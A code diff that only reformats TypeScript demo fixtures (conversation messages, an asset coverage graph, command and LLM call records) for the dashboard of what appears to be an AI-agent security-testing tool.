       worker: "mainagent",
       ts: T("2026-07-25T15:45:05Z"),
       kind: "thinking",
-      get summary() { return swt("interface.m2737"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2737");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 3,
       worker: "mainagent",
       ts: T("2026-07-25T15:45:10Z"),
       kind: "text",
-      get summary() { return swt("interface.m2738"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2738");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 4,
       worker: "user",
       ts: T("2026-07-25T21:05:00Z"),
       kind: "user",
-      get summary() { return swt("interface.m2739"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2739");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 5,
@@ -4044,42 +5570,72 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c31",
       summary: "200",
-      get detail() { return swt("interface.m2740"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+      get detail() {
+        return swt("interface.m2740");
+      },
+      set detail(value: string) {
+        Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 7,
       worker: "mainagent",
       ts: T("2026-07-25T21:05:20Z"),
       kind: "text",
-      get summary() { return swt("interface.m2741"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2741");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 8,
       worker: "user",
       ts: T("2026-07-25T23:25:00Z"),
       kind: "user",
-      get summary() { return swt("interface.m2742"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2742");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 9,
       worker: "mainagent",
       ts: T("2026-07-25T23:25:10Z"),
       kind: "text",
-      get summary() { return swt("interface.m2743"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2743");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
-    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", get summary() { return swt("interface.m2744"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } },
+    {
+      seq: 10,
+      worker: "user",
+      ts: T("2026-07-26T00:22:00Z"),
+      kind: "user",
+      get summary() {
+        return swt("interface.m2744");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
+    },
     {
       seq: 11,
       worker: "mainagent",
       ts: T("2026-07-26T00:22:12Z"),
       kind: "text",
-      get summary() { return swt("interface.m2745"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2745");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
   ],
 };
@@ -4153,8 +5709,12 @@ export const coverageGraph = {
       domain: "www.acme.com",
       url: "https://www.acme.com",
       port: 443,
-      get page_title() { return swt("interface.m2746"); },
-    set page_title(value: string) { Object.defineProperty(this, "page_title", { value, writable: true, enumerable: true, configurable: true }); },
+      get page_title() {
+        return swt("interface.m2746");
+      },
+      set page_title(value: string) {
+        Object.defineProperty(this, "page_title", { value, writable: true, enumerable: true, configurable: true });
+      },
       status_code: 200,
     },
     {
@@ -4200,8 +5760,12 @@ export const coverageGraph = {
       domain: "admin.acme.com",
       url: "https://admin.acme.com",
       port: 443,
-      get page_title() { return swt("interface.m2747"); },
-    set page_title(value: string) { Object.defineProperty(this, "page_title", { value, writable: true, enumerable: true, configurable: true }); },
+      get page_title() {
+        return swt("interface.m2747");
+      },
+      set page_title(value: string) {
+        Object.defineProperty(this, "page_title", { value, writable: true, enumerable: true, configurable: true });
+      },
       status_code: 200,
     },
     {
@@ -4269,8 +5833,12 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       name: "notes.md",
       dir: false,
       size: 96,
-      get content() { return swt("interface.m2752"); },
-    set content(value: string) { Object.defineProperty(this, "content", { value, writable: true, enumerable: true, configurable: true }); },
+      get content() {
+        return swt("interface.m2752");
+      },
+      set content(value: string) {
+        Object.defineProperty(this, "content", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
   ],
   "t-001": [
@@ -4289,13 +5857,26 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       name: "response.html",
       dir: false,
       size: 180,
-      get content() { return swt("interface.m2753"); },
-    set content(value: string) { Object.defineProperty(this, "content", { value, writable: true, enumerable: true, configurable: true }); },
+      get content() {
+        return swt("interface.m2753");
+      },
+      set content(value: string) {
+        Object.defineProperty(this, "content", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
   ],
   transcripts: [
-    { name: "exp1-worker-i12.jsonl", dir: false, size: 512, get content() { return swt("interface.m2754"); },
-    set content(value: string) { Object.defineProperty(this, "content", { value, writable: true, enumerable: true, configurable: true }); } },
+    {
+      name: "exp1-worker-i12.jsonl",
+      dir: false,
+      size: 512,
+      get content() {
+        return swt("interface.m2754");
+      },
+      set content(value: string) {
+        Object.defineProperty(this, "content", { value, writable: true, enumerable: true, configurable: true });
+      },
+    },
   ],
 };
 
@@ -4334,8 +5915,12 @@ export const commandRecords = [
     worker: "worker-1",
     tool: "bash",
     command: JSON.stringify({ command: "curl -s 'https://www.acme.com/search?q=test'" }),
-    get output() { return swt("interface.m2755"); },
-    set output(value: string) { Object.defineProperty(this, "output", { value, writable: true, enumerable: true, configurable: true }); },
+    get output() {
+      return swt("interface.m2755");
+    },
+    set output(value: string) {
+      Object.defineProperty(this, "output", { value, writable: true, enumerable: true, configurable: true });
+    },
     is_error: false,
     created_at: T("2026-08-09T02:10:00Z"),
   },
@@ -4387,8 +5972,12 @@ export const llmRecords = [
     id: 1,
     ts: T("2026-08-09T02:10:02Z"),
     model: "claude-opus-4-8",
-    get profile_name() { return swt("interface.m0077"); },
-    set profile_name(value: string) { Object.defineProperty(this, "profile_name", { value, writable: true, enumerable: true, configurable: true }); },
+    get profile_name() {
+      return swt("interface.m0077");
+    },
+    set profile_name(value: string) {
+      Object.defineProperty(this, "profile_name", { value, writable: true, enumerable: true, configurable: true });
+    },
     session_id: "exp1-worker-i12",
     task_id: "t-001",
     worker: "worker-1",
@@ -4403,8 +5992,12 @@ export const llmRecords = [
     id: 2,
     ts: T("2026-08-09T02:11:40Z"),
     model: "claude-opus-4-8",
-    get profile_name() { return swt("interface.m0077"); },
-    set profile_name(value: string) { Object.defineProperty(this, "profile_name", { value, writable: true, enumerable: true, configurable: true }); },
+    get profile_name() {
+      return swt("interface.m0077");
+    },
+    set profile_name(value: string) {
+      Object.defineProperty(this, "profile_name", { value, writable: true, enumerable: true, configurable: true });
+    },
     session_id: "exp1-planner",
     task_id: "t-001",
     worker: "planner",
@@ -4419,8 +6012,12 @@ export const llmRecords = [
     id: 3,
     ts: T("2026-08-09T02:15:20Z"),
     model: "claude-opus-4-8",
-    get profile_name() { return swt("interface.m0077"); },
-    set profile_name(value: string) { Object.defineProperty(this, "profile_name", { value, writable: true, enumerable: true, configurable: true }); },
+    get profile_name() {
+      return swt("interface.m0077");
+    },
+    set profile_name(value: string) {
+      Object.defineProperty(this, "profile_name", { value, writable: true, enumerable: true, configurable: true });
+    },
     session_id: "exp1-worker-i18",
     task_id: "t-001",
     worker: "worker-2",
@@ -4435,8 +6032,12 @@ export const llmRecords = [
     id: 4,
     ts: T("2026-08-09T02:16:05Z"),
     model: "claude-opus-4-8",
-    get profile_name() { return swt("interface.m0077"); },
-    set profile_name(value: string) { Object.defineProperty(this, "profile_name", { value, writable: true, enumerable: true, configurable: true }); },
+    get profile_name() {
+      return swt("interface.m0077");
+    },
+    set profile_name(value: string) {
+      Object.defineProperty(this, "profile_name", { value, writable: true, enumerable: true, configurable: true });
+    },
     session_id: "exp1-worker-i18",
     task_id: "t-001",
     worker: "worker-2",
@@ -4446,8 +6047,12 @@ export const llmRecords = [
     cache_read: 5200,
     cache_write: 0,
     status: "error",
-    get error() { return swt("interface.m2756"); },
-    set error(value: string) { Object.defineProperty(this, "error", { value, writable: true, enumerable: true, configurable: true }); },
+    get error() {
+      return swt("interface.m2756");
+    },
+    set error(value: string) {
+      Object.defineProperty(this, "error", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
 ];
 
@@ -4487,9 +6092,7 @@ export function llmRecordDetail(id: number, records = llmRecords) {
       model: item.model,
       max_tokens: 8192,
       stream: true,
-      system: [
-        { type: "text", text: swt("interface.m2757"), cache_control: { type: "ephemeral" } },
-      ],
+      system: [{ type: "text", text: swt("interface.m2757"), cache_control: { type: "ephemeral" } }],
       messages: [{ role: "user", content: swt("interface.m2758") }],
       tools: [
         {
@@ -4524,4 +6127,50 @@ export function llmRecordDetail(id: number, records = llmRecords) {
 }
 
 // Prepare only authored initial fixtures; editable runtime values are never rescanned.
-for (const fixture of [ACTIVE_TASK, tasks, taskCategories, taskTemplates, getTask, companies, assets, assetCounts, findings, explorationGraph, intents, frontier, activity, tokenWorkers, tokenSessions, tokenTotal, dailyTokens, convTokens, traffic, trafficHosts, trafficDetail, audit, llmProfiles, llmConfig, agents, mcpServers, mcpToolsById, skills, skillCalls, missingSkills, tools, settings, llmPool, interceptRules, interceptPending, interceptHistory, interceptDetails, conversations, conversationMessages, coverage, coverageGraph, commandRecords, llmRecords, llmTasks]) prepareDemoFixture(fixture);
+for (const fixture of [
+  ACTIVE_TASK,
+  tasks,
+  taskCategories,
+  taskTemplates,
+  getTask,
+  companies,
+  assets,
+  assetCounts,
+  findings,
+  explorationGraph,
+  intents,
+  frontier,
+  activity,
+  tokenWorkers,
+  tokenSessions,
+  tokenTotal,
+  dailyTokens,
+  convTokens,
+  traffic,
+  trafficHosts,
+  trafficDetail,
+  audit,
+  llmProfiles,
+  llmConfig,
+  agents,
+  mcpServers,
+  mcpToolsById,
+  skills,
+  skillCalls,
+  missingSkills,
+  tools,
+  settings,
+  llmPool,
+  interceptRules,
+  interceptPending,
+  interceptHistory,
+  interceptDetails,
+  conversations,
+  conversationMessages,
+  coverage,
+  coverageGraph,
+  commandRecords,
+  llmRecords,
+  llmTasks,
+])
+  prepareDemoFixture(fixture);
